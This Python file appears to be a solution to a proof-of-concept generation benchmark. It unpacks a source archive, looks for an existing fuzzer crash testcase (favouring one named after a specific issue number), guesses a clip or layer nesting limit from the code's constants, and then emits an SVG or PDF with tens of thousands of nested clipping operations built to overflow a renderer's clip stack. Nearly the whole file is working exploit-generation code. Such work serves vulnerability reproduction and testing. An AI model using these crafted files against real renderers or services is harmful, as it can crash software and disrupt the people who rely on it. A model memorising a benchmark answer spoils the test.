import os
import re
import tarfile
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple


class Solution:
    _CODE_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".rs", ".m", ".mm", ".java", ".kt", ".swift", ".go"
    }

    _POC_NAME_HINTS = (
        "clusterfuzz", "testcase", "poc", "repro", "crash", "overflow", "oob",
        "heap", "asan", "ubsan", "issue", "bug"
    )

    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            root = os.path.abspath(src_path)
            embedded = self._find_embedded_poc(root)
            if embedded is not None:
                return embedded
            fmt = self._detect_format(root)
            limit, score = self._guess_nesting_limit(root)
            if fmt == "pdf":
                depth = self._choose_depth_pdf(limit, score)
                return self._gen_pdf(depth)
            depth = self._choose_depth_svg(limit, score)
            return self._gen_svg(depth)

        with tempfile.TemporaryDirectory() as td:
            root = self._extract_src(src_path, td)

            embedded = self._find_embedded_poc(root)
            if embedded is not None:
                return embedded

            fmt = self._detect_format(root)
            limit, score = self._guess_nesting_limit(root)

            if fmt == "pdf":
                depth = self._choose_depth_pdf(limit, score)
                return self._gen_pdf(depth)

            depth = self._choose_depth_svg(limit, score)
            return self._gen_svg(depth)

    def _extract_src(self, src_path: str, dst_dir: str) -> str:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                self._safe_extract(tf, dst_dir)
        except tarfile.TarError:
            return os.path.abspath(src_path)

        entries = [p for p in Path(dst_dir).iterdir() if p.name not in (".", "..")]
        if len(entries) == 1 and entries[0].is_dir():
            return str(entries[0].resolve())
        return str(Path(dst_dir).resolve())

    def _safe_extract(self, tf: tarfile.TarFile, dst_dir: str) -> None:
        base = Path(dst_dir).resolve()
        for m in tf.getmembers():
            if not m.name:
                continue
            if m.islnk() or m.issym() or m.isdev():
                continue
            name = m.name.replace("\\", "/")
            if name.startswith("/"):
                continue
            parts = Path(name).parts
            if any(p == ".." for p in parts):
                continue
            out_path = (base / name).resolve()
            if base not in out_path.parents and out_path != base:
                continue
            try:
                tf.extract(m, dst_dir)
            except Exception:
                continue

    def _find_embedded_poc(self, root: str) -> Optional[bytes]:
        best_path = None
        best_score = -1
        best_size = -1

        for dirpath, dirnames, filenames in os.walk(root):
            dlow = dirpath.lower()
            if any(x in dlow for x in ("/.git", "/.hg", "/.svn", "/build", "/out", "/bazel-", "/cmake-build")):
                continue

            for fn in filenames:
                flow = fn.lower()
                hint_hits = sum(1 for h in self._POC_NAME_HINTS if h in flow)
                if hint_hits == 0:
                    continue

                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue

                if st.st_size <= 0 or st.st_size > 8_000_000:
                    continue

                score = hint_hits * 10
                if "clusterfuzz" in flow:
                    score += 25
                if "minimized" in flow:
                    score += 10
                if "42537171" in flow:
                    score += 100

                if score > best_score or (score == best_score and st.st_size > best_size):
                    best_score = score
                    best_size = st.st_size
                    best_path = p

        if best_path is None:
            return None

        try:
            with open(best_path, "rb") as f:
                return f.read()
        except OSError:
            return None

    def _detect_format(self, root: str) -> str:
        fmt = self._detect_format_from_bug_keywords(root)
        if fmt != "unknown":
            return fmt

        fuzzer_files = self._find_fuzzer_files(root)
        if not fuzzer_files:
            return "svg"

        scores: Dict[str, int] = {"svg": 0, "pdf": 0, "json": 0, "xml": 0}
        for p in fuzzer_files[:50]:
            data = self._read_small(p, 2_000_000)
            if not data:
                continue
            low = data.lower()
            scores["svg"] += low.count(b"svg") * 2 + low.count(b"sksvg") * 8 + low.count(b"svgt") * 2
            scores["pdf"] += low.count(b"pdf") * 2 + low.count(b"mupdf") * 8 + low.count(b"poppler") * 4
            scores["json"] += low.count(b"json") * 2 + low.count(b"lottie") * 6
            scores["xml"] += low.count(b"xml") * 2 + low.count(b"xpath") * 2

        if scores["pdf"] > max(scores["svg"], scores["json"], scores["xml"]) * 1.2:
            return "pdf"
        if scores["svg"] >= max(scores["pdf"], scores["json"]):
            return "svg"
        if scores["xml"] > 0 and scores["svg"] == 0 and scores["pdf"] == 0:
            return "svg"
        if scores["json"] > max(scores["pdf"], scores["svg"]):
            return "json"
        return "svg"

    def _detect_format_from_bug_keywords(self, root: str) -> str:
        keyword_files = self._find_files_containing_any(root, [b"clip mark", b"clip_mark", b"clipmark", b"layer/clip", b"layer clip"])
        if not keyword_files:
            keyword_files = self._find_files_containing_any(root, [b"nesting depth", b"nesting_depth", b"layer", b"clip stack", b"layer stack"])

        svg_votes = 0
        pdf_votes = 0
        for p in keyword_files[:80]:
            plow = p.lower()
            if any(x in plow for x in ("/svg", "svg/", "svgr", "rsvg", "usvg")):
                svg_votes += 4
            if any(x in plow for x in ("/pdf", "pdf/", "mupdf", "poppler", "pdfium")):
                pdf_votes += 4

            data = self._read_small(p, 512_000)
            if not data:
                continue
            low = data.lower()
            svg_votes += low.count(b"svg")
            pdf_votes += low.count(b"pdf")
            if b"<svg" in low:
                svg_votes += 10

        if pdf_votes > svg_votes * 1.3 and pdf_votes > 5:
            return "pdf"
        if svg_votes > 5:
            return "svg"
        return "unknown"

    def _find_fuzzer_files(self, root: str) -> List[str]:
        out: List[str] = []
        for dirpath, dirnames, filenames in os.walk(root):
            dlow = dirpath.lower()
            if any(x in dlow for x in ("/.git", "/.hg", "/.svn", "/build", "/out", "/bazel-", "/cmake-build")):
                continue
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in self._CODE_EXTS:
                    continue
                p = os.path.join(dirpath, fn)
                data = self._read_small(p, 800_000)
                if not data:
                    continue
                if b"LLVMFuzzerTestOneInput" in data:
                    out.append(p)
        return out

    def _find_files_containing_any(self, root: str, needles: List[bytes]) -> List[str]:
        out: List[str] = []
        for dirpath, dirnames, filenames in os.walk(root):
            dlow = dirpath.lower()
            if any(x in dlow for x in ("/.git", "/.hg", "/.svn", "/build", "/out", "/bazel-", "/cmake-build")):
                continue
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in self._CODE_EXTS:
                    continue
                p = os.path.join(dirpath, fn)
                data = self._read_small(p, 900_000)
                if not data:
                    continue
                low = data.lower()
                for n in needles:
                    if n in low:
                        out.append(p)
                        break
        return out

    def _read_small(self, path: str, limit: int) -> Optional[bytes]:
        try:
            st = os.stat(path)
            if st.st_size <= 0:
                return None
            if st.st_size > limit:
                with open(path, "rb") as f:
                    return f.read(limit)
            with open(path, "rb") as f:
                return f.read()
        except OSError:
            return None

    def _guess_nesting_limit(self, root: str) -> Tuple[Optional[int], int]:
        candidates: List[Tuple[int, int]] = []

        kw_files = self._find_files_containing_any(
            root,
            [b"nest", b"nesting", b"depth", b"stack", b"clip", b"layer", b"clip mark", b"clip_mark", b"clipmark"],
        )

        scan_files = kw_files[:200]
        if not scan_files:
            scan_files = self._sample_code_files(root, 200)

        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_0-9]*?(?:NEST|DEPTH|STACK|CLIP|LAYER)[A-Za-z_0-9]*)\s+([0-9]+)\b', re.I)
        const_re = re.compile(r'\b(const|static|constexpr)?\s*(?:size_t|usize|int|unsigned|uint32_t|uint16_t|long)\s+([A-Za-z_0-9]*?(?:NEST|DEPTH|STACK|CLIP|LAYER)[A-Za-z_0-9]*)\s*(?:=\s*|:\s*)([0-9]+)\b', re.I)
        hex_re = re.compile(r'\b0x[0-9a-fA-F]{3,8}\b')
        dec_re = re.compile(r'\b[0-9]{3,7}\b')
        shift_re = re.compile(r'\b1\s*(?:u|ul|ull|usize)?\s*<<\s*([0-9]{1,2})\b', re.I)

        for p in scan_files:
            data = self._read_small(p, 1_500_000)
            if not data:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                text = data.decode("latin1", "ignore")

            for line in text.splitlines():
                l = line.strip()
                if not l:
                    continue
                llow = l.lower()
                if not (("clip" in llow or "layer" in llow) and ("nest" in llow or "depth" in llow or "stack" in llow)):
                    if "nest" not in llow and "depth" not in llow and "stack" not in llow:
                        continue

                base_score = 0
                if "max" in llow:
                    base_score += 4
                if "nest" in llow:
                    base_score += 4
                if "depth" in llow:
                    base_score += 4
                if "stack" in llow:
                    base_score += 3
                if "clip" in llow:
                    base_score += 3
                if "layer" in llow:
                    base_score += 2
                if "push" in llow:
                    base_score += 2
                if "mark" in llow:
                    base_score += 1

                m = define_re.match(l)
                if m:
                    name, val_s = m.group(1), m.group(2)
                    val = int(val_s)
                    cand_score = base_score + 10 + self._name_bonus(name)
                    if 128 <= val <= 200000:
                        candidates.append((val, cand_score))
                    continue

                m = const_re.search(l)
                if m:
                    name, val_s = m.group(2), m.group(3)
                    try:
                        val = int(val_s)
                    except ValueError:
                        val = None
                    if val is not None and 128 <= val <= 200000:
                        cand_score = base_score + 8 + self._name_bonus(name)
                        candidates.append((val, cand_score))

                for sm in shift_re.finditer(l):
                    sh = int(sm.group(1))
                    if 7 <= sh <= 20:
                        val = 1 << sh
                        if 128 <= val <= 200000:
                            candidates.append((val, base_score + 5))

                for hm in hex_re.finditer(l):
                    try:
                        val = int(hm.group(0), 16)
                    except ValueError:
                        continue
                    if 128 <= val <= 200000:
                        candidates.append((val, base_score + 1))

                for dm in dec_re.finditer(l):
                    try:
                        val = int(dm.group(0))
                    except ValueError:
                        continue
                    if 128 <= val <= 200000:
                        candidates.append((val, base_score))

        if not candidates:
            return None, 0

        best_val = None
        best_score = -1
        for val, sc in candidates:
            if sc > best_score or (sc == best_score and (best_val is None or val > best_val)):
                best_val = val
                best_score = sc

        return best_val, best_score

    def _name_bonus(self, name: str) -> int:
        n = name.lower()
        b = 0
        if "max" in n:
            b += 3
        if "nest" in n:
            b += 4
        if "depth" in n:
            b += 4
        if "stack" in n:
            b += 2
        if "clip" in n:
            b += 2
        if "layer" in n:
            b += 1
        return b

    def _sample_code_files(self, root: str, max_files: int) -> List[str]:
        out: List[str] = []
        for dirpath, dirnames, filenames in os.walk(root):
            dlow = dirpath.lower()
            if any(x in dlow for x in ("/.git", "/.hg", "/.svn", "/build", "/out", "/bazel-", "/cmake-build")):
                continue
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in self._CODE_EXTS:
                    continue
                out.append(os.path.join(dirpath, fn))
                if len(out) >= max_files:
                    return out
        return out

    def _choose_depth_svg(self, limit: Optional[int], score: int) -> int:
        base = 33000
        if limit is None:
            return base

        if limit < 512 or limit > 200000:
            return base

        if score >= 18:
            return int(limit + 16)
        if 24000 <= limit <= 60000 and score >= 12:
            return int(limit + 16)
        if 12000 <= limit < 24000 and score >= 20:
            return int(limit + 16)

        return base

    def _choose_depth_pdf(self, limit: Optional[int], score: int) -> int:
        base = 40000
        if limit is None:
            return base
        if limit < 256 or limit > 250000:
            return base
        if score >= 18 and limit <= 80000:
            return int(limit + 32)
        return base

    def _gen_svg(self, depth: int) -> bytes:
        if depth < 1:
            depth = 1

        header = b'<svg xmlns="http://www.w3.org/2000/svg">'
        defs = b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
        open_tag = b'<g clip-path="url(#c)">'
        close_tag = b'</g>'
        inner = b'<rect width="1" height="1"/>'
        tail = b'</svg>'

        out = bytearray()
        out += header
        out += defs
        out += open_tag * depth
        out += inner
        out += close_tag * depth
        out += tail
        return bytes(out)

    def _gen_pdf(self, depth: int) -> bytes:
        if depth < 1:
            depth = 1

        # Content stream: nested saves + clips, then restores.
        # Pattern: q 0 0 1 1 re W n
        open_cmd = b"q 0 0 1 1 re W n\n"
        close_cmd = b"Q\n"
        content = open_cmd * depth + close_cmd * depth

        parts: List[bytes] = []
        parts.append(b"%PDF-1.4\n")

        obj1 = b"1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj\n"
        obj2 = b"2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj\n"
        obj3 = b"3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>endobj\n"
        obj4 = b"4 0 obj<< /Length " + str(len(content)).encode("ascii") + b" >>stream\n" + content + b"endstream\nendobj\n"

        objs = [obj1, obj2, obj3, obj4]

        offsets = [0]
        cur = len(parts[0])
        for o in objs:
            offsets.append(cur)
            parts.append(o)
            cur += len(o)

        xref_start = cur
        nobj = 5
        xref = bytearray()
        xref += b"xref\n"
        xref += b"0 " + str(nobj).encode("ascii") + b"\n"
        xref += b"0000000000 65535 f \n"
        for off in offsets[1:]:
            xref += f"{off:010d} 00000 n \n".encode("ascii")

        trailer = bytearray()
        trailer += b"trailer<< /Size " + str(nobj).encode("ascii") + b" /Root 1 0 R >>\n"
        trailer += b"startxref\n" + str(xref_start).encode("ascii") + b"\n%%EOF\n"

        parts.append(bytes(xref))
        parts.append(bytes(trailer))
        return b"".join(parts)